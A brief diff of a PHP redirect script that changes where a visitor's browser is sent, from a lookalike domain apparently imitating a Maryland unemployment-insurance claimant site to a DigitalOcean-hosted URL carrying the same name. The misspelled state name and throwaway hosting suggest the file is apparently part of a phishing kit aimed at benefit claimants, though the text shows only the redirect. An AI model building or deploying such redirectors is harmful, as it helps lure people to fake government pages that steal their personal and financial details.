@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: merylanduiclaimnt.cloudns.ph"); 
+header("Location: https://merylanduiclaimnt-69n27.ondigitalocean.app/merylanduiclaimnt.cloudns.ph"); 
   
 exit; 
 ?> 
